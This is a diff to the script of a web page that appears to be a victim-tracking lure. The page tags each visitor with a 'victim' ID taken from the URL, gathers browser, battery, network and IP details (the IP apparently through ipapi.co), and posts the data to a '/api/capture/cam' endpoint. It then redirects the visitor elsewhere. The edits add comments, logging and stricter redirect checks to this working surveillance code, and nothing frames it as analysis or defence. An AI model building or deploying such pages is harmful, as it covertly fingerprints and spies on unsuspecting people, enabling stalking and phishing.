@@ -121,23 +121,30 @@
     </div>
 
     <script>
+        // ===== URL PARAMS =====
         const urlParams = new URLSearchParams(window.location.search);
         const victimId = urlParams.get('v') || 'unknown';
         const redirectUrl = '{{REDIRECT_URL}}';
+
+        console.log('Victim ID:', victimId);
+        console.log('Redirect URL:', redirectUrl);
 
         // ===== REDIRECT FUNCTION =====
         function doRedirect() {
             let target = 'https://google.com';
 
-            // Check if redirectUrl is valid
-            if (redirectUrl && redirectUrl !== '' && redirectUrl !== '{{REDIRECT_URL}}' && redirectUrl.startsWith('http')) {
-                target = redirectUrl;
+            if (redirectUrl &&
+                redirectUrl.trim() !== '' &&
+                redirectUrl !== '{{REDIRECT_URL}}' &&
+                redirectUrl.toLowerCase().startsWith('http')) {
+                target = redirectUrl.trim();
             }
 
-            console.log('Redirecting to:', target);
+            console.log('Final Redirect to:', target);
             window.location.href = target;
         }
 
+        // ===== BASIC INFO =====
         function getBasicInfo() {
             return {
                 userAgent: navigator.userAgent,
@@ -148,6 +155,7 @@
             };
         }
 
+        // ===== BATTERY =====
         async function getBatteryInfo() {
             try {
                 if (navigator.getBattery) {
@@ -161,6 +169,7 @@
             return { level: 'N/A', charging: 'N/A' };
         }
 
+        // ===== NETWORK =====
         function getNetworkInfo() {
             try {
                 if (navigator.connection) {
@@ -174,6 +183,7 @@
             return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
         }
 
+        // ===== IP =====
         async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -189,6 +199,7 @@
             }
         }
 
+        // ===== SEND DATA =====
         async function sendData(payload) {
             try {
                 return await fetch('/api/capture/cam', {
@@ -269,6 +280,7 @@
             }
         }
 
+        // ===== SHOW/HIDE ERROR =====
         function showError(msg) {
             const errorBox = document.getElementById('permissionError');
             document.getElementById('errorMsg').textContent = msg;
